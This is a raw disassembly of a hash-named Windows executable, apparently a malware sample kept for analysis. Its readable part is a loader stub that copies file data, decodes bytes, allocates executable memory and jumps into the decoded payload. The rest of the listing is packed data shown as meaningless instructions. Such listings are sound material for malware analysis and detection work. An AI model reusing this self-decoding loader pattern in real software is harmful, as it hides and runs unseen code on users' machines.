
997bc4793ee4646a07a0ca926beeb78f2b63fd1a1dbeed324d033cd8bca586d9.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0xd9c6c7f2
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	in     eax,dx
  41145b:	xchg   ecx,eax
  41145c:	outs   dx,BYTE PTR ds:[esi]
  41145d:	outs   dx,DWORD PTR ds:[esi]
  41145e:	idiv   DWORD PTR [ebp+0x14]
  411461:	mov    al,ds:0x53fcca75
  411466:	mov    WORD PTR [edx+0x59],gs
  411469:	addr16 xchg esp,eax
  41146b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41146c:	pop    es
  41146d:	in     al,dx
  41146e:	cmp    ebx,DWORD PTR [edi-0x40]
  411471:	sbb    al,0x58
  411473:	or     ecx,esi
  411475:	pop    ds
  411476:	mov    ebp,0xf1c65e1b
  41147b:	sti    
  41147c:	daa    
  41147d:	gs cwde 
  41147f:	leave  
  411480:	imul   BYTE PTR [esi]
  411482:	outs   dx,BYTE PTR ds:[esi]
  411483:	xchg   esp,eax
  411484:	mov    eax,0xfc96915a
  411489:	pop    eax
  41148a:	adc    eax,0xdaac3bb1
  41148f:	xor    ebx,edi
  411491:	neg    DWORD PTR [eax+0x67]
  411494:	dec    edi
  411495:	dec    esi
  411496:	stc    
  411497:	hlt    
  411498:	xchg   DWORD PTR [ebp-0x710c2dd7],esp
  41149e:	iret   
  41149f:	test   eax,0xa74cd080
  4114a4:	not    BYTE PTR [ecx-0x64b92cb8]
  4114aa:	(bad)  [ecx]
  4114ac:	push   edi
  4114ad:	mov    es,WORD PTR [ecx-0x4]
  4114b0:	in     eax,dx
  4114b1:	cmp    DWORD PTR ds:0x5bf105a5,ebx
  4114b7:	push   es
  4114b8:	je     0x4114d2
  4114ba:	clc    
  4114bb:	pop    eax
  4114bc:	in     al,dx
  4114bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114be:	sbb    ebx,DWORD PTR [ebx-0x3982ace5]
  4114c4:	and    edx,DWORD PTR ss:[ebp-0x4044dd47]
  4114cb:	push   ds
  4114cc:	sbb    ah,BYTE PTR [esi-0x3403b8c8]
  4114d2:	adc    edi,0x1ba7df2e
  4114d8:	out    dx,eax
  4114d9:	rol    BYTE PTR [edx+0x73],1
  4114dc:	bound  esi,QWORD PTR [edi]
  4114de:	fcmovb st,st(0)
  4114e0:	pop    eax
  4114e1:	in     eax,0xe2
  4114e3:	ret    
  4114e4:	aas    
  4114e5:	cmp    cl,BYTE PTR [ebp+0x70]
  4114e8:	mov    esp,0x3a7e66b6
  4114ed:	dec    ebx
  4114ee:	jne    0x4114ec
  4114f0:	stos   DWORD PTR es:[edi],eax
  4114f1:	gs pop esp
  4114f3:	in     eax,dx
  4114f4:	pushf  
  4114f5:	adc    al,0x15
  4114f7:	pop    edi
  4114f8:	js     0x4114d8
  4114fa:	jno    0x4114b1
  4114fc:	lds    edi,FWORD PTR ds:0x4ae6dbbf
  411502:	in     eax,dx
  411503:	js     0x4114b5
  411505:	lds    eax,FWORD PTR [ebp+0x15a1902b]
  41150b:	push   eax
  41150c:	sub    al,cl
  41150e:	adc    ah,BYTE PTR [ebx-0x35]
  411511:	push   esp
  411512:	xchg   esp,eax
  411513:	add    ecx,DWORD PTR [ebx-0x641d65f4]
  411519:	callw  0xa343
  41151d:	mov    dh,0xd8
  41151f:	push   esi
  411520:	out    dx,al
  411521:	add    BYTE PTR [ecx-0x3909f509],ch
  411527:	jns    0x4114c0
  411529:	pop    edi
  41152a:	pushf  
  41152b:	out    0xbe,al
  41152d:	mov    ds:0xc849c2cc,al
  411532:	add    eax,0x16c0cbdc
  411537:	and    BYTE PTR ds:0x3cb08fae,dl
  41153d:	push   ecx
  41153e:	adc    BYTE PTR [edi],ah
  411540:	mov    ch,0x32
  411542:	and    esi,DWORD PTR [esi]
  411544:	cs xchg edx,eax
  411546:	xor    ebp,ebp
  411548:	outs   dx,BYTE PTR ds:[esi]
  411549:	retf   0x2f92
  41154c:	sub    esp,DWORD PTR [edi]
  41154e:	in     eax,0x37
  411550:	sbb    eax,0x8f4e4801
  411555:	xchg   edx,edx
  411557:	dec    esp
  411558:	cmp    al,0xa3
  41155a:	jl     0x411598
  41155c:	dec    ebx
  41155d:	icebp  
  41155e:	shr    DWORD PTR [ecx],0xe0
  411561:	leave  
  411562:	pop    edi
  411563:	adc    BYTE PTR [esi-0x6afbef59],dh
  411569:	adc    DWORD PTR [ecx+ecx*2],0x25
  41156d:	nop
  41156e:	mov    dl,0x88
  411570:	dec    esi
  411571:	outs   dx,BYTE PTR ds:[esi]
  411572:	lock adc BYTE PTR cs:[edx-0x3e],bh
  411577:	sbb    al,0x8d
  411579:	aad    0x81
  41157b:	and    eax,0xb2026cb2
  411580:	cdq    
  411581:	in     eax,dx
  411582:	jl     0x41157f
  411584:	lods   al,BYTE PTR ds:[esi]
  411585:	xchg   edi,eax
  411586:	and    al,0xad
  411588:	scas   al,BYTE PTR es:[edi]
  411589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41158a:	lock jns 0x4115dc
  41158d:	push   esp
  41158e:	mov    dl,0x21
  411590:	les    edx,FWORD PTR [edx+0x5]
  411593:	mov    ah,al
  411595:	int3   
  411596:	in     eax,0xed
  411598:	sar    DWORD PTR [ecx],1
  41159a:	stos   DWORD PTR es:[edi],eax
  41159b:	adc    BYTE PTR [ebp-0x1a],cl
  41159e:	xchg   BYTE PTR [ebx+0x76],dh
  4115a1:	sub    esi,DWORD PTR [edx]
  4115a3:	je     0x41153c
  4115a5:	mov    eax,0x91f84b9d
  4115aa:	gs das 
  4115ac:	jge    0x411592
  4115ae:	or     al,0x9f
  4115b0:	jne    0x4115ca
  4115b2:	lahf   
  4115b3:	int    0x21
  4115b5:	and    edi,edi
  4115b7:	push   0xc
  4115b9:	jo     0x4115d5
  4115bb:	sbb    dl,dl
  4115bd:	sub    bl,BYTE PTR [eax+edx*1]
  4115c0:	ins    BYTE PTR es:[edi],dx
  4115c1:	jl     0x4115f4
  4115c3:	(bad)  
  4115c4:	out    dx,al
  4115c5:	mov    edx,ecx
  4115c7:	adc    edx,DWORD PTR [eax+0x6e6271e0]
  4115cd:	sbb    BYTE PTR [ebx],0x19
  4115d0:	push   ss
  4115d1:	pop    ebx
  4115d2:	repnz sahf 
  4115d4:	push   edi
  4115d5:	sub    ch,0x2
  4115d8:	ret    0xcb9a
  4115db:	inc    esp
  4115dc:	iret   
  4115dd:	cmp    edx,DWORD PTR [ebp+0x1f]
  4115e0:	std    
  4115e1:	pop    ebp
  4115e2:	push   ss
  4115e3:	sbb    ebp,DWORD PTR [ebx+0x29935b5d]
  4115e9:	xchg   BYTE PTR [esi],al
  4115eb:	scas   al,BYTE PTR es:[edi]
  4115ec:	repnz mov dh,0x3b
  4115ef:	and    BYTE PTR [esi+0x33],dh
  4115f2:	into   
  4115f3:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115f5:	pop    edx
  4115f6:	mov    eax,0xaef6cb22
  4115fb:	imul   eax,DWORD PTR [edx+0x4a],0xffffff92
  4115ff:	and    al,0x32
  411601:	mov    esp,0xf69f9435
  411606:	daa    
  411607:	and    eax,DWORD PTR [eax+0x7]
  41160a:	lock xchg ecx,eax
  41160c:	imul   ebp,DWORD PTR ds:0xc438bd69,0xea45eebb
  411616:	mov    eax,0xb54251c3
  41161b:	mov    ecx,0xfcb85968
  411620:	mov    edi,0x162eec20
  411625:	jmp    0xc86c:0x4854952c
  41162c:	jbe    0x411686
  41162e:	or     BYTE PTR ds:[edi+0x67],dh
  411632:	adc    eax,0x86430edb
  411637:	shr    ebx,0x12
  41163a:	call   0x978cf1b7
  41163f:	mov    eax,ds:0xe1aa0d28
  411644:	dec    eax
  411645:	test   eax,0x27fc8ea8
  41164a:	mov    ah,0x49
  41164c:	push   es
  41164d:	xor    BYTE PTR [edi],dh
  41164f:	add    cl,BYTE PTR [esi-0x35]
  411652:	and    ah,ch
  411654:	fistp  QWORD PTR [ecx]
  411656:	xor    ah,BYTE PTR [ecx-0x56ebf443]
  41165c:	jmp    0x56993627
  411661:	xchg   ebp,eax
  411662:	pusha  
  411663:	sub    BYTE PTR [esi],0x3d
  411666:	add    bh,BYTE PTR [ecx-0x76]
  411669:	pop    esi
  41166a:	scas   eax,DWORD PTR es:[edi]
  41166b:	aam    0xa8
  41166d:	mov    ebx,0xed4c526f
  411672:	inc    eax
  411673:	add    al,0x2a
  411675:	adc    eax,0x46a7b011
  41167a:	clc    
  41167b:	sub    al,0x7d
  41167d:	out    dx,eax
  41167e:	test   al,0x47
  411680:	push   esp
  411681:	mov    esi,?
  411683:	aad    0x80
  411685:	push   ecx
  411686:	xchg   esi,eax
  411687:	mov    ebx,0xf549e5c4
  41168c:	retf   0xa8b0
  41168f:	call   0x970:0x623ed8dc
  411696:	mov    bl,0x29
  411698:	mov    ebp,0x3d1a13c3
  41169d:	pusha  
  41169e:	mov    ch,0x93
  4116a0:	xchg   ecx,eax
  4116a1:	fdivr  DWORD PTR [edi]
  4116a3:	push   0xd80b4a68
  4116a8:	jmp    0x5384:0x73edf592
  4116af:	inc    ecx
  4116b0:	lahf   
  4116b1:	and    cl,BYTE PTR [ecx-0x18f35a87]
  4116b7:	xor    al,dl
  4116b9:	arpl   WORD PTR [edx],sp
  4116bb:	cli    
  4116bc:	inc    ecx
  4116bd:	pop    esi
  4116be:	push   ecx
  4116bf:	xor    DWORD PTR [ebp+0x5116d3c0],ebp
  4116c5:	sbb    al,0xcd
  4116c7:	scas   al,BYTE PTR es:[edi]
  4116c8:	ficomp WORD PTR [ecx+ebx*2+0x1c7af347]
  4116cf:	neg    bl
  4116d1:	pop    esp
  4116d2:	sub    eax,0xf7cc5cd7
  4116d7:	loop   0x4116a1
  4116d9:	and    ecx,ecx
  4116db:	xchg   BYTE PTR [ebx+0x724f2ecf],ch
  4116e1:	jg     0x4116dd
  4116e3:	retf   
  4116e4:	xchg   cl,dh
  4116e6:	ss mov dh,0x76
  4116e9:	and    al,0x6a
  4116eb:	(bad)  [ebp+0x2676e31]
  4116f1:	mov    ecx,0xaea3e0ef
  4116f6:	stos   BYTE PTR es:[edi],al
  4116f7:	clc    
  4116f8:	loopne 0x4116c9
  4116fa:	jae    0x4116d1
  4116fc:	lods   eax,DWORD PTR ds:[esi]
  4116fd:	jne    0x411688
  4116ff:	bound  ebp,QWORD PTR [eax]
  411701:	mov    ebp,0x1f239d0f
  411706:	je     0x4116fe
  411708:	xchg   esi,eax
  411709:	jbe    0x41172e
  41170b:	push   0x6a
  41170d:	inc    esp
  41170e:	add    DWORD PTR [ebp+0x70],esp
  411711:	sbb    ah,BYTE PTR [esi]
  411713:	pop    edi
  411714:	imul   esi,esi,0xffffffdd
  411717:	push   cs
  411718:	(bad)  
  411719:	ror    DWORD PTR [ecx-0x5f330be2],cl
  41171f:	sti    
  411720:	fild   QWORD PTR [eax]
  411722:	bound  ebp,QWORD PTR [ecx]
  411724:	lds    edi,FWORD PTR [eax-0x69]
  411727:	xchg   esi,eax
  411728:	cmp    eax,0xbb3ab330
  41172d:	push   0x8c7290e9
  411732:	or     DWORD PTR ds:0xcbf77408,edi
  411738:	or     dh,al
  41173a:	jno    0x411786
  41173c:	mov    edi,0xed2ccbb0
  411741:	into   
  411742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411743:	imul   ebp,DWORD PTR [edi-0x4a8d5d09],0x54f852d5
  41174d:	mul    ah
  41174f:	fistp  WORD PTR fs:[ebx+0x32]
  411753:	lods   eax,DWORD PTR ds:[esi]
  411754:	jmp    0x4117a3
  411756:	cwde   
  411757:	pushf  
  411758:	mov    ds:0xca8085a3,eax
  41175d:	mov    dl,0x5a
  41175f:	inc    eax
  411760:	enter  0x506b,0x9e
  411764:	repz mov al,0x19
  411767:	out    dx,eax
  411768:	leave  
  411769:	cmp    DWORD PTR [esi-0x91f4c3e],0xffffffcf
  411770:	cdq    
  411771:	pop    ds
  411772:	or     al,0xfd
  411774:	iret   
  411775:	daa    
  411776:	sub    BYTE PTR [ebx-0x7fcce332],bl
  41177c:	(bad)  
  41177d:	lock test eax,0xfb2fdd39
  411783:	je     0x411764
  411785:	xchg   DWORD PTR [ebp+0x7300ddd2],ebp
  41178b:	push   0x76
  41178d:	mov    edi,0x6f659d4f
  411792:	mov    dl,0xd6
  411794:	mov    eax,0xbfe2720f
  411799:	pusha  
  41179a:	aas    
  41179b:	imul   ebx,edi,0xffffff83
  41179e:	mov    cl,0xab
  4117a0:	outs   dx,DWORD PTR ds:[esi]
  4117a1:	inc    ebx
  4117a2:	jl     0x4117d9
  4117a4:	test   DWORD PTR [ebp-0x31],ecx
  4117a7:	out    0x7d,eax
  4117a9:	js     0x4117ec
  4117ab:	out    dx,eax
  4117ac:	je     0x4117d6
  4117ae:	mov    edx,0xb18eea7b
  4117b3:	mov    al,0xf3
  4117b5:	lea    edx,ss:[edx-0x776fd3e4]
  4117bc:	into   
  4117bd:	fwait
  4117be:	sub    eax,0x49cddbab
  4117c3:	repnz mov WORD PTR [eax],ss
  4117c6:	or     al,0xff
  4117c8:	test   ebx,esi
  4117ca:	imul   ecx,DWORD PTR [edi+0x45],0x3913a405
  4117d1:	xchg   ebx,eax
  4117d2:	(bad)  
  4117d4:	sbb    eax,0x9e3a14d2
  4117d9:	cs mov esi,0x402e4aa7
  4117df:	sub    ecx,DWORD PTR [edi+0x12411186]
  4117e5:	and    eax,0x8bb57bf2
  4117ea:	stc    
  4117eb:	std    
  4117ec:	dec    ebp
  4117ed:	pushf  
  4117ee:	push   esp
  4117ef:	lahf   
  4117f0:	add    al,0x96
  4117f2:	push   ss
  4117f3:	adc    edx,DWORD PTR [ecx-0x6f]
  4117f6:	jp     0x4117ef
  4117f8:	push   es
  4117f9:	xchg   DWORD PTR [edx+0x5b],esi
  4117fc:	std    
  4117fd:	(bad)  [ebx-0x75]
  411800:	sub    ebp,ebp
  411802:	pop    ebx
  411803:	xchg   esp,eax
  411804:	arpl   WORD PTR [ebp+esi*8-0x65],dx
  411808:	popa   
  411809:	popf   
  41180a:	xlat   BYTE PTR ds:[ebx]
  41180b:	or     bl,ch
  41180d:	or     dl,dh
  41180f:	adc    dl,BYTE PTR [eax+0x42]
  411812:	out    0x3d,al
  411814:	add    eax,0x7520a8dd
  411819:	dec    ebp
  41181a:	gs js  0x4117ba
  41181d:	cs xchg ebp,eax
  41181f:	jns    0x4117e8
  411821:	cmp    ah,ah
  411823:	push   0x15
  411825:	mov    DWORD PTR [edi+edx*2+0x54],ebx
  411829:	(bad)  
  41182a:	xchg   esi,eax
  41182b:	fst    DWORD PTR [ecx-0x2767ac52]
  411831:	xchg   BYTE PTR ds:0xe9bc9ac9,bl
  411837:	mov    dl,0xb4
  411839:	pusha  
  41183a:	dec    ebx
  41183b:	cli    
  41183c:	addr16 and ecx,ebp
  41183f:	cli    
  411840:	es and esp,ecx
  411843:	fucom  st(0)
  411845:	int3   
  411846:	push   edi
  411847:	dec    esp
  411848:	mov    BYTE PTR [edx*1-0x5c9c1b7a],cl
  41184f:	outs   dx,BYTE PTR ds:[esi]
  411850:	xor    cl,BYTE PTR [eax+0x23bebeaa]
  411856:	cmc    
  411857:	inc    ebx
  411858:	mov    dl,0x9e
  41185a:	sub    al,0xe5
  41185c:	icebp  
  41185d:	mov    ch,0x36
  41185f:	fiadd  WORD PTR [ecx+0x5c6ad4f5]
  411865:	push   ss
  411866:	call   0x2308:0x6054e1fc
  41186d:	lods   al,BYTE PTR ds:[esi]
  41186e:	mov    esi,0x5f46d0c8
  411873:	dec    esp
  411874:	xchg   esp,eax
  411875:	(bad)  
  411876:	xchg   esp,eax
  411877:	dec    DWORD PTR [ebx-0x6f]
  41187a:	dec    ebx
  41187b:	test   BYTE PTR [edx-0x41],dh
  41187e:	jle    0x411840
  411880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411881:	sahf   
  411882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411883:	das    
  411884:	jmp    0x8564:0x85d17f1e
  41188b:	aas    
  41188c:	in     eax,dx
  41188d:	mov    edx,0xfd645601
  411892:	jo     0x411817
  411894:	mov    bl,0x3f
  411896:	jg     0x411840
  411898:	or     eax,0x8a4efa1b
  41189d:	pop    es
  41189e:	mov    ebx,DWORD PTR [ebx+ecx*2]
  4118a1:	mov    cl,0x97
  4118a3:	les    ecx,FWORD PTR [edi-0x3d]
  4118a6:	scas   eax,DWORD PTR es:[edi]
